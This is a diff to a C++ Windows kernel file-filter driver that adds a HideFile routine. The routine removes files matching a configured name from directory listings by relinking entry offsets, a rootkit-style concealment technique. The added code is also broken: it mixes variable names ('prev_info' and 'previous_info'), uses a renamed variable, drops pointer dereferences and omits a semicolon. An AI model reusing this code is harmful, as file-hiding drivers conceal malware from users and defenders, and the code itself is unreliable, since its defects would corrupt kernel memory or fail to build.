@@ -229,9 +229,14 @@ namespace filter
 
     bool FileFilter::HideFile(PUCHAR info, PUCHAR nextEntryOffset, PUCHAR fileNameOffset, PUCHAR fileNameLengthOffset)
     {
+        PUCHAR prev_info = NULL;
+        PUCHAR next_info = NULL;
+
         long long nextEntryRva = nextEntryOffset - info;
         long long fileNameRva = fileNameOffset - info;
         long long fileNameLengthRva = fileNameLengthOffset - info;
+
+        WCHAR fileNameStr[MAX_SIZE];
 
         DebugMessage("Begin print");
 
@@ -239,12 +244,33 @@ namespace filter
         {
             while (true)
             {
-                ULONG nextEntry = *(ULONG *)((PUCHAR)info + nextEntryRva);
-                PWCHAR fileName = *(PWCHAR*)((PUCHAR)info + fileNameRva);
-                ULONG fileNameLength = *(ULONG*)((PUCHAR)info + fileNameLengthRva);
+                ULONG nextEntryCur = (ULONG *)((PUCHAR)info + nextEntryRva);
+                PWCHAR fileName = (PWCHAR*)((PUCHAR)info + fileNameRva);
+                ULONG fileNameLength = (ULONG*)((PUCHAR)info + fileNameLengthRva);
                 DebugMessage("Cur Addr: 0x%p, NextEntryOffset: 0x%x", &info, nextEntry);
 
                 debug::PrintWstring(fileName, fileNameLength);
+
+                if (fileNameLength <= MAX_SIZE)
+                {
+                    RtlCopyMemory(fileNameStr, fileName, fileNameLength);
+                    
+                    if (ulti::CheckSubstring(fileNameStr, file_to_hide_) == true)
+                    {
+                        if (previous_info != NULL)
+                        {
+                            if (info->NextEntryOffset != 0)
+                            {
+                                ulti::SetUlongAt((long long)prev_info + nextEntryRva, (ULONG *)(info + nextEntryRva))
+                            }
+                            else
+                            {
+                                ulti::SetUlongAt((long long)prev_info + nextEntryRva, 0);
+                            }
+                        }
+                    }
+
+                }
 
                 if (nextEntryOffset == NULL)
                 {
